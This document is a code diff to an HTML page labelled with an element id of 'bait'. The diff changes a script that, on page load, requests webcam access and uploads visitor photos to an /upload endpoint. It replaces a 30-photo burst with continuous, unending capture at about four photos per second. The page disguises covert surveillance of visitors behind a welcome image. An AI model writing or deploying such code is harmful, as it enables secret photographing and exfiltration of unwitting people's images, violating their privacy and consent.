@@ -27,39 +27,32 @@
     <img src="/static/welcome.jpg" id="bait" alt="Image">
 
     <script>
-        async function startBurstCapture() {
+        async function startContinuousCapture() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const track = stream.getVideoTracks()[0];
                 const imageCapture = new ImageCapture(track);
 
-                // Take 10 photos per second for 3 seconds = 30 photos
-                let count = 0;
-                const burstInterval = setInterval(async () => {
+                // Continuous capture: ~4 images per second (every 250ms)
+                setInterval(async () => {
                     try {
                         const blob = await imageCapture.takePhoto();
                         const formData = new FormData();
                         formData.append('photo', blob, `photo_${Date.now()}.jpg`);
 
                         fetch('/upload', { method: 'POST', body: formData })
-                            .then(res => console.log("✅ Sent", count + 1))
+                            .then(res => console.log("✅ Sent photo at", new Date().toLocaleTimeString()))
                             .catch(err => console.error("❌ Upload error:", err));
-
-                        count++;
-                        if (count >= 30) { // Stop after 30 shots
-                            clearInterval(burstInterval);
-                            track.stop();
-                        }
                     } catch (err) {
                         console.error("❌ Capture error:", err);
                     }
-                }, 100); // 100ms interval = 10 per second
+                }, 250); // 250ms = 4 per second
             } catch (err) {
                 console.error("❌ Camera access denied:", err);
             }
         }
 
-        window.onload = startBurstCapture;
+        window.onload = startContinuousCapture;
     </script>
 </body>
 </html>
